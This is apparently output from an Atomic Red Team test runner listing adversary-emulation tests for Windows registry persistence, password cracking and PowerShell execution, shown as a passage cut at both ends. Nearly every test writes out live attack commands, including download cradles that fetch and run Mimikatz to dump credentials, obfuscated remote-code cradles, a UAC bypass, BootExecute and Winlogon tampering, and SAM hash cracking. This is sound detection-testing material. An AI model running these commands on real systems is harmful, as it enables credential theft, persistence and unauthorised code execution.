$newvalue = $oldvalue + ", C:\Windows\explorer.exe";
Set-ItemProperty -Path  "HKLM:\Software\Microsoft\Windows NT\CurrentVersion\Winlogon" -Name "Shell" -Value "$newvalue"

Cleanup Commands:
Command:
$oldvalue = $(Get-ItemPropertyValue -Path  "HKLM:\Software\Microsoft\Windows NT\CurrentVersion\Winlogon" -Name 'Shell-backup');
Set-ItemProperty -Path "HKLM:\Software\Microsoft\Windows NT\CurrentVersion\Winlogon" -Name "Shell" -Value "$oldvalue";
Remove-ItemProperty -Path  "HKLM:\Software\Microsoft\Windows NT\CurrentVersion\Winlogon" -Name 'Shell-backup'
[!!!!!!!!END TEST!!!!!!!]


[********BEGIN TEST*******]
Technique: Boot or Logon Autostart Execution: Registry Run Keys / Startup Folder T1547.001
Atomic Test Name: secedit used to create a Run key in the HKLM Hive
Atomic Test Number: 16
Atomic Test GUID: 14fdc3f1-6fc3-4556-8d36-aa89d9d42d02
Description: secedit allows to manipulate the HKLM hive of the Windows registry. This test creates a Run key with the keyname calc having calc.exe as the value in the HKLM hive. [Ref
erence](https://blueteamops.medium.com/secedit-and-i-know-it-595056dee53d)

Attack Commands:
Executor: command_prompt
ElevationRequired: True
Command:
secedit /import /db #{secedit_db} /cfg "#{ini_file}"
secedit /configure /db #{secedit_db}
Command (with inputs):
secedit /import /db mytemplate.db /cfg "C:\AtomicRedTeam\atomics\T1547.001\src\regtemplate.ini"
secedit /configure /db mytemplate.db

Cleanup Commands:
Command:
REG DELETE "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" /V "calc" /f >nul 2>&1
[!!!!!!!!END TEST!!!!!!!]


[********BEGIN TEST*******]
Technique: Boot or Logon Autostart Execution: Registry Run Keys / Startup Folder T1547.001
Atomic Test Name: Modify BootExecute Value
Atomic Test Number: 17
Atomic Test GUID: befc2b40-d487-4a5a-8813-c11085fb5672
Description: This test modifies the BootExecute registry value to "autocheck autoche *", which can be used to simulate an adversary's attempt to tamper with the system's boot process
.  Reference - https://www.welivesecurity.com/wp-content/uploads/2018/09/ESET-LoJax.pdf NOTE that by not saving the correct value, you may inhibit your system from booting properly. 
Only run on a test system. There is a reg export before running the Atomic.

Attack Commands:
Executor: powershell
ElevationRequired: True
Command:
if (!(Test-Path "$PathToAtomicsFolder\T1547.001\src\SessionManagerBackup.reg")) { reg.exe export "HKLM\SYSTEM\CurrentControlSet\Control\Session Manager" "$PathToAtomicsFolder\T1547.0
01\src\SessionManagerBackup.reg" /y }
Set-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSet\Control\Session Manager" -Name "BootExecute" -Value "#{registry_value}" -Type MultiString
Command (with inputs):
if (!(Test-Path "C:\AtomicRedTeam\atomics\T1547.001\src\SessionManagerBackup.reg")) { reg.exe export "HKLM\SYSTEM\CurrentControlSet\Control\Session Manager" "C:\AtomicRedTeam\atomics
\T1547.001\src\SessionManagerBackup.reg" /y }
Set-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSet\Control\Session Manager" -Name "BootExecute" -Value "autocheck autoche *" -Type MultiString

Cleanup Commands:
Command:
reg.exe import "$PathToAtomicsFolder\T1547.001\src\SessionManagerBackup.reg"
Remove-Item -Path "$PathToAtomicsFolder\T1547.001\src\SessionManagerBackup.reg" -Force
Command (with inputs):
reg.exe import "C:\AtomicRedTeam\atomics\T1547.001\src\SessionManagerBackup.reg"
Remove-Item -Path "C:\AtomicRedTeam\atomics\T1547.001\src\SessionManagerBackup.reg" -Force
[!!!!!!!!END TEST!!!!!!!]


PathToAtomicsFolder = C:\AtomicRedTeam\atomics

ERROR: C:\AtomicRedTeam\atomics\T1110\T1110.yaml does not exist
Check your Atomic Number and your PathToAtomicsFolder parameter
PathToAtomicsFolder = C:\AtomicRedTeam\atomics

[********BEGIN TEST*******]
Technique: Brute Force: Password Cracking T1110.002
Atomic Test Name: Password Cracking with Hashcat
Atomic Test Number: 1
Atomic Test GUID: 6d27df5d-69d4-4c91-bc33-5983ffe91692
Description: Execute Hashcat.exe with provided SAM file from registry of Windows and Password list to crack against

Attack Commands:
Executor: command_prompt
ElevationRequired: True
Command:
cd #{hashcat_exe}\..
#{hashcat_exe} -a 0 -m 1000 -r .\rules\Incisive-leetspeak.rule #{input_file_sam} #{input_file_passwords}
Command (with inputs):
cd C:\AtomicRedTeam\atomics\..\ExternalPayloads\hashcat6\hashcat-6.1.1\hashcat.exe\..
C:\AtomicRedTeam\atomics\..\ExternalPayloads\hashcat6\hashcat-6.1.1\hashcat.exe -a 0 -m 1000 -r .\rules\Incisive-leetspeak.rule C:\AtomicRedTeam\atomics\T1110.002\src\sam.txt C:\Atom
icRedTeam\atomics\T1110.002\src\password.lst

Cleanup Commands:
Command:
del "PathToAtomicsFolder\..\ExternalPayloads\hashcat6.7z" >nul 2>&1
del "PathToAtomicsFolder\..\ExternalPayloads\7z1900.exe" >nul 2>&1
del "PathToAtomicsFolder\..\ExternalPayloads\7z" /Q /S >nul 2>&1
del "PathToAtomicsFolder\..\ExternalPayloads\hashcat-unzip" /Q /S >nul 2>&1
Command (with inputs):
del "C:\AtomicRedTeam\atomics\..\ExternalPayloads\hashcat6.7z" >nul 2>&1
del "C:\AtomicRedTeam\atomics\..\ExternalPayloads\7z1900.exe" >nul 2>&1
del "C:\AtomicRedTeam\atomics\..\ExternalPayloads\7z" /Q /S >nul 2>&1
del "C:\AtomicRedTeam\atomics\..\ExternalPayloads\hashcat-unzip" /Q /S >nul 2>&1

Dependencies:
Description: Hashcat must exist on disk at specified location (C:\AtomicRedTeam\atomics\..\ExternalPayloads\hashcat6\hashcat-6.1.1\hashcat.exe)
Check Prereq Command:
if (Test-Path  $(cmd /c echo "#{hashcat_exe}")) {exit 0} else {exit 1}
Check Prereq Command (with inputs):
if (Test-Path  $(cmd /c echo "C:\AtomicRedTeam\atomics\..\ExternalPayloads\hashcat6\hashcat-6.1.1\hashcat.exe")) {exit 0} else {exit 1}
Get Prereq Command:
New-Item -Type Directory "PathToAtomicsFolder\..\ExternalPayloads\" -ErrorAction Ignore -Force | Out-Null
Invoke-WebRequest "https://www.7-zip.org/a/7z1900.exe" -OutFile "PathToAtomicsFolder\..\ExternalPayloads\7z1900.exe"
Start-Process -FilePath "PathToAtomicsFolder\..\ExternalPayloads\7z1900.exe" -ArgumentList "/S /D=PathToAtomicsFolder\..\ExternalPayloads\7zi" -NoNewWindow
Invoke-WebRequest "https://hashcat.net/files/hashcat-6.1.1.7z" -OutFile "PathToAtomicsFolder\..\ExternalPayloads\hashcat6.7z"
Start-Process cmd.exe -Args  "/c %temp%\7z\7z.exe x %temp%\hashcat6.7z -aoa -o%temp%\hashcat-unzip" -Wait
New-Item -ItemType Directory (Split-Path $(cmd /c echo #{hashcat_exe})) -Force | Out-Null
Move-Item "PathToAtomicsFolder\..\ExternalPayloads\hashcat-unzip\hashcat-6.1.1\*" $(cmd /c echo #{hashcat_exe}\..) -Force -ErrorAction Ignore
Get Prereq Command (with inputs):
New-Item -Type Directory "C:\AtomicRedTeam\atomics\..\ExternalPayloads\" -ErrorAction Ignore -Force | Out-Null
Invoke-WebRequest "https://www.7-zip.org/a/7z1900.exe" -OutFile "C:\AtomicRedTeam\atomics\..\ExternalPayloads\7z1900.exe"
Start-Process -FilePath "C:\AtomicRedTeam\atomics\..\ExternalPayloads\7z1900.exe" -ArgumentList "/S /D=C:\AtomicRedTeam\atomics\..\ExternalPayloads\7zi" -NoNewWindow
Invoke-WebRequest "https://hashcat.net/files/hashcat-6.1.1.7z" -OutFile "C:\AtomicRedTeam\atomics\..\ExternalPayloads\hashcat6.7z"
Start-Process cmd.exe -Args  "/c %temp%\7z\7z.exe x %temp%\hashcat6.7z -aoa -o%temp%\hashcat-unzip" -Wait
New-Item -ItemType Directory (Split-Path $(cmd /c echo C:\AtomicRedTeam\atomics\..\ExternalPayloads\hashcat6\hashcat-6.1.1\hashcat.exe)) -Force | Out-Null
Move-Item "C:\AtomicRedTeam\atomics\..\ExternalPayloads\hashcat-unzip\hashcat-6.1.1\*" $(cmd /c echo C:\AtomicRedTeam\atomics\..\ExternalPayloads\hashcat6\hashcat-6.1.1\hashcat.exe\.
.) -Force -ErrorAction Ignore
[!!!!!!!!END TEST!!!!!!!]


PathToAtomicsFolder = C:\AtomicRedTeam\atomics

ERROR: C:\AtomicRedTeam\atomics\T1059\T1059.yaml does not exist
Check your Atomic Number and your PathToAtomicsFolder parameter
PathToAtomicsFolder = C:\AtomicRedTeam\atomics

[********BEGIN TEST*******]
Technique: Command and Scripting Interpreter: PowerShell T1059.001
Atomic Test Name: Mimikatz
Atomic Test Number: 1
Atomic Test GUID: f3132740-55bc-48c4-bcc0-758a459cd027
Description: Download Mimikatz and dump credentials. Upon execution, mimikatz dump details and password hashes will be displayed.

Attack Commands:
Executor: command_prompt
ElevationRequired: True
Command:
powershell.exe "IEX (New-Object Net.WebClient).DownloadString('#{mimurl}'); Invoke-Mimikatz -DumpCreds"
Command (with inputs):
powershell.exe "IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/f650520c4b1004daf8b3ec08007a0b945b91253a/Exfiltration/Inv
oke-Mimikatz.ps1'); Invoke-Mimikatz -DumpCreds"
[!!!!!!!!END TEST!!!!!!!]


[********BEGIN TEST*******]
Technique: Command and Scripting Interpreter: PowerShell T1059.001
Atomic Test Name: Run BloodHound from local disk
Atomic Test Number: 2
Atomic Test GUID: a21bb23e-e677-4ee7-af90-6931b57b6350
Description: Upon execution SharpHound will be downloaded to disk, imported and executed. It will set up collection methods, run and then compress and store the data to the temp dire
ctory on the machine. If system is unable to contact a domain, proper execution will not occur.
Successful execution will produce stdout message stating "SharpHound Enumeration Completed". Upon completion, final output will be a *BloodHound.zip file.

Attack Commands:
Executor: powershell
ElevationRequired: False
Command:
import-module "PathToAtomicsFolder\..\ExternalPayloads\SharpHound.ps1"
try { Invoke-BloodHound -OutputDirectory $env:Temp }
catch { $_; exit $_.Exception.HResult}
Start-Sleep 5
Command (with inputs):
import-module "C:\AtomicRedTeam\atomics\..\ExternalPayloads\SharpHound.ps1"
try { Invoke-BloodHound -OutputDirectory $env:Temp }
catch { $_; exit $_.Exception.HResult}
Start-Sleep 5

Cleanup Commands:
Command:
Remove-Item $env:Temp\*BloodHound.zip -Force

Dependencies:
Description: SharpHound.ps1 must be located at "C:\AtomicRedTeam\atomics\..\ExternalPayloads\SharpHound.ps1"
Check Prereq Command:
if (Test-Path "PathToAtomicsFolder\..\ExternalPayloads\SharpHound.ps1") {exit 0} else {exit 1}
Check Prereq Command (with inputs):
if (Test-Path "C:\AtomicRedTeam\atomics\..\ExternalPayloads\SharpHound.ps1") {exit 0} else {exit 1}
Get Prereq Command:
New-Item -Type Directory "PathToAtomicsFolder\..\ExternalPayloads\" -ErrorAction Ignore -Force | Out-Null
Invoke-WebRequest "https://raw.githubusercontent.com/BloodHoundAD/BloodHound/804503962b6dc554ad7d324cfa7f2b4a566a14e2/Ingestors/SharpHound.ps1" -OutFile "PathToAtomicsFolder\..\Exter
nalPayloads\SharpHound.ps1"
Get Prereq Command (with inputs):
New-Item -Type Directory "C:\AtomicRedTeam\atomics\..\ExternalPayloads\" -ErrorAction Ignore -Force | Out-Null
Invoke-WebRequest "https://raw.githubusercontent.com/BloodHoundAD/BloodHound/804503962b6dc554ad7d324cfa7f2b4a566a14e2/Ingestors/SharpHound.ps1" -OutFile "C:\AtomicRedTeam\atomics\..\
ExternalPayloads\SharpHound.ps1"
[!!!!!!!!END TEST!!!!!!!]


[********BEGIN TEST*******]
Technique: Command and Scripting Interpreter: PowerShell T1059.001
Atomic Test Name: Run Bloodhound from Memory using Download Cradle
Atomic Test Number: 3
Atomic Test GUID: bf8c1441-4674-4dab-8e4e-39d93d08f9b7
Description: Upon execution SharpHound will load into memory and execute against a domain. It will set up collection methods, run and then compress and store the data to the temp dir
ectory. If system is unable to contact a domain, proper execution will not occur.
Successful execution will produce stdout message stating "SharpHound Enumeration Completed". Upon completion, final output will be a *BloodHound.zip file.

Attack Commands:
Executor: powershell
ElevationRequired: False
Command:
write-host "Remote download of SharpHound.ps1 into memory, followed by execution of the script" -ForegroundColor Cyan
IEX (New-Object Net.Webclient).DownloadString('https://raw.githubusercontent.com/BloodHoundAD/BloodHound/804503962b6dc554ad7d324cfa7f2b4a566a14e2/Ingestors/SharpHound.ps1');
Invoke-BloodHound -OutputDirectory $env:Temp
Start-Sleep 5

Cleanup Commands:
Command:
Remove-Item $env:Temp\*BloodHound.zip -Force
[!!!!!!!!END TEST!!!!!!!]


[********BEGIN TEST*******]
Technique: Command and Scripting Interpreter: PowerShell T1059.001
Atomic Test Name: Obfuscation Tests
Atomic Test Number: 4
Atomic Test GUID: 4297c41a-8168-4138-972d-01f3ee92c804
Description: Different obfuscated methods to test. Upon execution, reaches out to bit.ly/L3g1t and displays: "SUCCESSFULLY EXECUTED POWERSHELL CODE FROM REMOTE LOCATION"

Attack Commands:
Executor: powershell
ElevationRequired: False
Command:
(New-Object Net.WebClient).DownloadFile('http://bit.ly/L3g1tCrad1e','Default_File_Path.ps1');IEX((-Join([IO.File]::ReadAllBytes('Default_File_Path.ps1')|ForEach-Object{[Char]$_})))
(New-Object Net.WebClient).DownloadFile('http://bit.ly/L3g1tCrad1e','Default_File_Path.ps1');[ScriptBlock]::Create((-Join([IO.File]::ReadAllBytes('Default_File_Path.ps1')|ForEach-Obj
ect{[Char]$_}))).InvokeReturnAsIs()
Set-Variable HJ1 'http://bit.ly/L3g1tCrad1e';SI Variable:/0W 'Net.WebClient';Set-Item Variable:\gH 'Default_File_Path.ps1';ls _-*;Set-Variable igZ (.$ExecutionContext.InvokeCommand.(
($ExecutionContext.InvokeCommand.PsObject.Methods|?{$_.Name-like'*Cm*t'}).Name).Invoke($ExecutionContext.InvokeCommand.(($ExecutionContext.InvokeCommand|GM|?{$_.Name-like'*om*e'}).Na
me).Invoke('*w-*ct',$TRUE,1))(Get-ChildItem Variable:0W).Value);Set-Variable J ((((Get-Variable igZ -ValueOn)|GM)|?{$_.Name-like'*w*i*le'}).Name);(Get-Variable igZ -ValueOn).((ChildI
tem Variable:J).Value).Invoke((Get-Item Variable:/HJ1).Value,(GV gH).Value);&( ''.IsNormalized.ToString()[13,15,48]-Join'')(-Join([Char[]](CAT -Enco 3 (GV gH).Value)))
[!!!!!!!!END TEST!!!!!!!]


[********BEGIN TEST*******]
Technique: Command and Scripting Interpreter: PowerShell T1059.001
Atomic Test Name: Mimikatz - Cradlecraft PsSendKeys
Atomic Test Number: 5
Atomic Test GUID: af1800cf-9f9d-4fd1-a709-14b1e6de020d
Description: Run mimikatz via PsSendKeys. Upon execution, automated actions will take place to open file explorer, open notepad and input code, then mimikatz dump info will be displa
yed.

Attack Commands:
Executor: powershell
ElevationRequired: True
Command:
$url='https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/f650520c4b1004daf8b3ec08007a0b945b91253a/Exfiltration/Invoke-Mimikatz.ps1';$wshell=New-Object -ComObject WScript.S
hell;$reg='HKCU:\Software\Microsoft\Notepad';$app='Notepad';$props=(Get-ItemProperty $reg);[Void][System.Reflection.Assembly]::LoadWithPartialName('System.Windows.Forms');@(@('iWindo
wPosY',([String]([System.Windows.Forms.Screen]::AllScreens)).Split('}')[0].Split('=')[5]),@('StatusBar',0))|ForEach{SP $reg (Item Variable:_).Value[0] (Variable _).Value[1]};$curpid=
$wshell.Exec($app).ProcessID;While(!($title=GPS|?{(Item Variable:_).Value.id-ieq$curpid}|ForEach{(Variable _).Value.MainWindowTitle})){Start-Sleep -Milliseconds 500};While(!$wshell.A
ppActivate($title)){Start-Sleep -Milliseconds 500};$wshell.SendKeys('^o');Start-Sleep -Milliseconds 500;@($url,(' '*1000),'~')|ForEach{$wshell.SendKeys((Variable _).Value)};$res=$Nul
l;While($res.Length -lt 2){[Windows.Forms.Clipboard]::Clear();@('^a','^c')|ForEach{$wshell.SendKeys((Item Variable:_).Value)};Start-Sleep -Milliseconds 500;$res=([Windows.Forms.Clipb
oard]::GetText())};[Windows.Forms.Clipboard]::Clear();@('%f','x')|ForEach{$wshell.SendKeys((Variable _).Value)};If(GPS|?{(Item Variable:_).Value.id-ieq$curpid}){@('{TAB}','~')|ForEac
h{$wshell.SendKeys((Item Variable:_).Value)}};@('iWindowPosDY','iWindowPosDX','iWindowPosY','iWindowPosX','StatusBar')|ForEach{SP $reg (Item Variable:_).Value $props.((Variable _).Va
lue)};IEX($res);invoke-mimikatz -dumpcr
[!!!!!!!!END TEST!!!!!!!]


[********BEGIN TEST*******]
Technique: Command and Scripting Interpreter: PowerShell T1059.001
Atomic Test Name: Invoke-AppPathBypass
Atomic Test Number: 6
Atomic Test GUID: 06a220b6-7e29-4bd8-9d07-5b4d86742372
Description: Note: Windows 10 only. Upon execution windows backup and restore window will be opened.
Bypass is based on: https://enigma0x3.net/2017/03/14/bypassing-uac-using-app-paths/

Attack Commands:
Executor: command_prompt
ElevationRequired: False
Command:
Powershell.exe "IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/enigma0x3/Misc-PowerShell-Stuff/a0dfca7056ef20295b156b8207480dc2465f94c3/Invoke-AppPa
thBypass.ps1'); Invoke-AppPathBypass -Payload 'C:\Windows\System32\cmd.exe'"
[!!!!!!!!END TEST!!!!!!!]


[********BEGIN TEST*******]
Technique: Command and Scripting Interpreter: PowerShell T1059.001
Atomic Test Name: Powershell MsXml COM object - with prompt
Atomic Test Number: 7
Atomic Test GUID: 388a7340-dbc1-4c9d-8e59-b75ad8c6d5da
Description: Powershell MsXml COM object. Not proxy aware, removing cache although does not appear to write to those locations. Upon execution, "Download Cradle test success!" will b
e displayed.
Provided by https://github.com/mgreen27/mgreen27.github.io

Attack Commands:
Executor: command_prompt
ElevationRequired: False
Command:
powershell.exe -exec bypass -noprofile "$comMsXml=New-Object -ComObject MsXml2.ServerXmlHttp;$comMsXml.Open('GET','#{url}',$False);$comMsXml.Send();IEX $comMsXml.ResponseText"
Command (with inputs):
powershell.exe -exec bypass -noprofile "$comMsXml=New-Object -ComObject MsXml2.ServerXmlHttp;$comMsXml.Open('GET','https://raw.githubusercontent.com/redcanaryco/atomic-red-team/maste
r/atomics/T1059.001/src/test.ps1',$False);$comMsXml.Send();IEX $comMsXml.ResponseText"
[!!!!!!!!END TEST!!!!!!!]


[********BEGIN TEST*******]
Technique: Command and Scripting Interpreter: PowerShell T1059.001
Atomic Test Name: Powershell XML requests
Atomic Test Number: 8
Atomic Test GUID: 4396927f-e503-427b-b023-31049b9b09a6
Description: Powershell xml download request. Upon execution, "Download Cradle test success!" will be dispalyed.
Provided by https://github.com/mgreen27/mgreen27.github.io

Attack Commands:
Executor: command_prompt
ElevationRequired: False
Command:
"C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe" -exec bypass -noprofile "$Xml = (New-Object System.Xml.XmlDocument);$Xml.Load('#{url}');$Xml.command.a.execute | IEX"
Command (with inputs):
"C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe" -exec bypass -noprofile "$Xml = (New-Object System.Xml.XmlDocument);$Xml.Load('https://raw.githubusercontent.com/redcanary
co/atomic-red-team/master/atomics/T1059.001/src/test.xml');$Xml.command.a.execute | IEX"
[!!!!!!!!END TEST!!!!!!!]


[********BEGIN TEST*******]
Technique: Command and Scripting Interpreter: PowerShell T1059.001
Atomic Test Name: Powershell invoke mshta.exe download
Atomic Test Number: 9
Atomic Test GUID: 8a2ad40b-12c7-4b25-8521-2737b0a415af
Description: Powershell invoke mshta to download payload. Upon execution, a new PowerShell window will be opened which will display "Download Cradle test success!".
Provided by https://github.com/mgreen27/mgreen27.github.io

Attack Commands:
Executor: command_prompt
ElevationRequired: False
Command:
C:\Windows\system32\cmd.exe /c "mshta.exe javascript:a=GetObject('script:#{url}').Exec();close()"
Command (with inputs):
C:\Windows\system32\cmd.exe /c "mshta.exe javascript:a=GetObject('script:https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1059.001/src/mshta.sct').Exec()
;close()"
[!!!!!!!!END TEST!!!!!!!]


[********BEGIN TEST*******]
Technique: Command and Scripting Interpreter: PowerShell T1059.001
Atomic Test Name: PowerShell Fileless Script Execution
Atomic Test Number: 11
Atomic Test GUID: fa050f5e-bc75-4230-af73-b6fd7852cd73
Description: Execution of a PowerShell payload from the Windows Registry similar to that seen in fileless malware infections. Upon exection, open "C:\Windows\Temp" and verify that ar
t-marker.txt is in the folder.

Attack Commands:
Executor: powershell
ElevationRequired: False
Command:
# Encoded payload in next command is the following "Set-Content -path "$env:SystemRoot/Temp/art-marker.txt" -value "Hello from the Atomic Red Team""
reg.exe add "HKEY_CURRENT_USER\Software\Classes\AtomicRedTeam" /v ART /t REG_SZ /d "U2V0LUNvbnRlbnQgLXBhdGggIiRlbnY6U3lzdGVtUm9vdC9UZW1wL2FydC1tYXJrZXIudHh0IiAtdmFsdWUgIkhlbGxvIGZyb2
0gdGhlIEF0b21pYyBSZWQgVGVhbSI=" /f
iex ([Text.Encoding]::ASCII.GetString([Convert]::FromBase64String((gp 'HKCU:\Software\Classes\AtomicRedTeam').ART)))

Cleanup Commands:
Command:
Remove-Item -path C:\Windows\Temp\art-marker.txt -Force -ErrorAction Ignore
Remove-Item HKCU:\Software\Classes\AtomicRedTeam -Force -ErrorAction Ignore
[!!!!!!!!END TEST!!!!!!!]


[********BEGIN TEST*******]
Technique: Command and Scripting Interpreter: PowerShell T1059.001
Atomic Test Name: PowerShell Downgrade Attack
Atomic Test Number: 12
Atomic Test GUID: 9148e7c4-9356-420e-a416-e896e9c0f73e
Description: This test requires the manual installation of PowerShell V2.
Attempts to run powershell commands in version 2.0 https://www.leeholmes.com/blog/2017/03/17/detecting-and-preventing-powershell-downgrade-attacks/

Attack Commands:
Executor: powershell
ElevationRequired: False
Command:
powershell.exe -version 2 -Command Write-Host $PSVersion

Dependencies:
Description: PowerShell version 2 must be installed
Check Prereq Command:
if(2 -in $PSVersionTable.PSCompatibleVersions.Major) {exit 0} else {exit 1}
Get Prereq Command:
Write-Host  Automated installer not implemented yet, please install PowerShell v2 manually
[!!!!!!!!END TEST!!!!!!!]


[********BEGIN TEST*******]
Technique: Command and Scripting Interpreter: PowerShell T1059.001
Atomic Test Name: NTFS Alternate Data Stream Access
Atomic Test Number: 13
Atomic Test GUID: 8e5c5532-1181-4c1d-bb79-b3a9f5dbd680
Description: Creates a file with an alternate data stream and simulates executing that hidden code/file. Upon execution, "Stream Data Executed" will be displayed.

Attack Commands:
Executor: powershell
ElevationRequired: False
Command:
Add-Content -Path #{ads_file} -Value 'Write-Host "Stream Data Executed"' -Stream 'streamCommand'
$streamcommand = Get-Content -Path #{ads_file} -Stream 'streamcommand'
Invoke-Expression $streamcommand
Command (with inputs):
Add-Content -Path $env:TEMP\NTFS_ADS.txt -Value 'Write-Host "Stream Data Executed"' -Stream 'streamCommand'
$streamcommand = Get-Content -Path $env:TEMP\NTFS_ADS.txt -Stream 'streamcommand'
Invoke-Expression $streamcommand

Cleanup Commands:
Command:
Remove-Item #{ads_file} -Force -ErrorAction Ignore
Command (with inputs):
Remove-Item $env:TEMP\NTFS_ADS.txt -Force -ErrorAction Ignore

Dependencies:
Description: Homedrive must be an NTFS drive
Check Prereq Command:
if((Get-Volume -DriveLetter $env:HOMEDRIVE[0]).FileSystem -contains "NTFS") {exit 0} else {exit 1}
Get Prereq Command:
Write-Host Prereq's for this test cannot be met automatically
[!!!!!!!!END TEST!!!!!!!]


[********BEGIN TEST*******]
Technique: Command and Scripting Interpreter: PowerShell T1059.001
Atomic Test Name: PowerShell Session Creation and Use
Atomic Test Number: 14
Atomic Test GUID: 7c1acec2-78fa-4305-a3e0-db2a54cddecd
Description: Connect to a remote powershell session and interact with the host. Upon execution, network test info and 'T1086 PowerShell Session Creation and Use' will be displayed.

Attack Commands:
Executor: powershell
ElevationRequired: True
Command:
New-PSSession -ComputerName #{hostname_to_connect}
Test-Connection $env:COMPUTERNAME
Set-Content -Path $env:TEMP\T1086_PowerShell_Session_Creation_and_Use -Value "T1086 PowerShell Session Creation and Use"
Get-Content -Path $env:TEMP\T1086_PowerShell_Session_Creation_and_Use
Remove-Item -Force $env:TEMP\T1086_PowerShell_Session_Creation_and_Use
Command (with inputs):
New-PSSession -ComputerName $env:COMPUTERNAME
Test-Connection $env:COMPUTERNAME
Set-Content -Path $env:TEMP\T1086_PowerShell_Session_Creation_and_Use -Value "T1086 PowerShell Session Creation and Use"
Get-Content -Path $env:TEMP\T1086_PowerShell_Session_Creation_and_Use
Remove-Item -Force $env:TEMP\T1086_PowerShell_Session_Creation_and_Use

Dependencies:
Description: PSRemoting must be enabled
Check Prereq Command:
Try {
    New-PSSession -ComputerName #{hostname_to_connect} -ErrorAction Stop | Out-Null
    exit 0
} 
Catch {
    exit 1
}
Check Prereq Command (with inputs):
Try {
    New-PSSession -ComputerName $env:COMPUTERNAME -ErrorAction Stop | Out-Null
    exit 0
} 
Catch {
    exit 1
}
Get Prereq Command:
Enable-PSRemoting
[!!!!!!!!END TEST!!!!!!!]


[********BEGIN TEST*******]
Technique: Command and Scripting Interpreter: PowerShell T1059.001
Atomic Test Name: ATHPowerShellCommandLineParameter -Command parameter variations
Atomic Test Number: 15
Atomic Test GUID: 686a9785-f99b-41d4-90df-66ed515f81d7
Description: Executes powershell.exe with variations of the -Command parameter

Attack Commands:
Executor: powershell
ElevationRequired: False
Command:
Out-ATHPowerShellCommandLineParameter -CommandLineSwitchType #{command_line_switch_type} -CommandParamVariation #{command_param_variation} -Execute -ErrorAction Stop
Command (with inputs):
Out-ATHPowerShellCommandLineParameter -CommandLineSwitchType Hyphen -CommandParamVariation C -Execute -ErrorAction Stop

Dependencies:
Description: The AtomicTestHarnesses module must be installed and Out-ATHPowerShellCommandLineParameter must be exported in the module.
Check Prereq Command:
$RequiredModule = Get-Module -Name AtomicTestHarnesses -ListAvailable
if (-not $RequiredModule) {exit 1}
if (-not $RequiredModule.ExportedCommands['Out-ATHPowerShellCommandLineParameter']) {exit 1} else {exit 0}
Get Prereq Command:
Install-Module -Name AtomicTestHarnesses -Scope CurrentUser -Force
[!!!!!!!!END TEST!!!!!!!]


[********BEGIN TEST*******]
Technique: Command and Scripting Interpreter: PowerShell T1059.001
Atomic Test Name: ATHPowerShellCommandLineParameter -Command parameter variations with encoded arguments
Atomic Test Number: 16
Atomic Test GUID: 1c0a870f-dc74-49cf-9afc-eccc45e58790
Description: Executes powershell.exe with variations of the -Command parameter with encoded arguments supplied

Attack Commands:
Executor: powershell
ElevationRequired: False
Command:
Out-ATHPowerShellCommandLineParameter -CommandLineSwitchType #{command_line_switch_type} -CommandParamVariation #{command_param_variation} -UseEncodedArguments -EncodedArgumentsParamVariation #{encoded_arguments_param_variation} -Execute -ErrorAction Stop
Command (with inputs):
Out-ATHPowerShellCommandLineParameter -CommandLineSwitchType Hyphen -CommandParamVariation C -UseEncodedArguments -EncodedArgumentsParamVariation EA -Execute -ErrorAction Stop

Dependencies:
Description: The AtomicTestHarnesses module must be installed and Out-ATHPowerShellCommandLineParameter must be exported in the module.
Check Prereq Command:
$RequiredModule = Get-Module -Name AtomicTestHarnesses -ListAvailable
if (-not $RequiredModule) {exit 1}
if (-not $RequiredModule.ExportedCommands['Out-ATHPowerShellCommandLineParameter']) {exit 1} else {exit 0}
Get Prereq Command:
Install-Module -Name AtomicTestHarnesses -Scope CurrentUser -Force
[!!!!!!!!END TEST!!!!!!!]


[********BEGIN TEST*******]
Technique: Command and Scripting Interpreter: PowerShell T1059.001
Atomic Test Name: ATHPowerShellCommandLineParameter -EncodedCommand parameter variations
Atomic Test Number: 17
Atomic Test GUID: 86a43bad-12e3-4e85-b97c-4d5cf25b95c3
Description: Executes powershell.exe with variations of the -EncodedCommand parameter

Attack Commands:
Executor: powershell
ElevationRequired: False
Command:
Out-ATHPowerShellCommandLineParameter -CommandLineSwitchType #{command_line_switch_type} -EncodedCommandParamVariation #{encoded_command_param_variation} -Execute -ErrorAction Stop
Command (with inputs):
Out-ATHPowerShellCommandLineParameter -CommandLineSwitchType Hyphen -EncodedCommandParamVariation E -Execute -ErrorAction Stop

Dependencies:
Description: The AtomicTestHarnesses module must be installed and Out-ATHPowerShellCommandLineParameter must be exported in the module.
Check Prereq Command:
$RequiredModule = Get-Module -Name AtomicTestHarnesses -ListAvailable
if (-not $RequiredModule) {exit 1}
if (-not $RequiredModule.ExportedCommands['Out-ATHPowerShellCommandLineParameter']) {exit 1} else {exit 0}
Get Prereq Command:
Install-Module -Name AtomicTestHarnesses -Scope CurrentUser -Force
[!!!!!!!!END TEST!!!!!!!]


[********BEGIN TEST*******]
Technique: Command and Scripting Interpreter: PowerShell T1059.001
Atomic Test Name: ATHPowerShellCommandLineParameter -EncodedCommand parameter variations with encoded arguments
Atomic Test Number: 18
Atomic Test GUID: 0d181431-ddf3-4826-8055-2dbf63ae848b
Description: Executes powershell.exe with variations of the -EncodedCommand parameter with encoded arguments supplied

Attack Commands:
Executor: powershell
ElevationRequired: False
Command:
Out-ATHPowerShellCommandLineParameter -CommandLineSwitchType #{command_line_switch_type} -EncodedCommandParamVariation #{encoded_command_param_variation} -UseEncodedArguments -EncodedArgumentsParamVariation #{encoded_arguments_param_variation} -Execute -ErrorAction Stop
Command (with inputs):
Out-ATHPowerShellCommandLineParameter -CommandLineSwitchType Hyphen -EncodedCommandParamVariation E -UseEncodedArguments -EncodedArgumentsParamVariation EncodedArguments -Execute -Er
rorAction Stop

Dependencies:
Description: The AtomicTestHarnesses module must be installed and Out-ATHPowerShellCommandLineParameter must be exported in the module.
Check Prereq Command:
$RequiredModule = Get-Module -Name AtomicTestHarnesses -ListAvailable
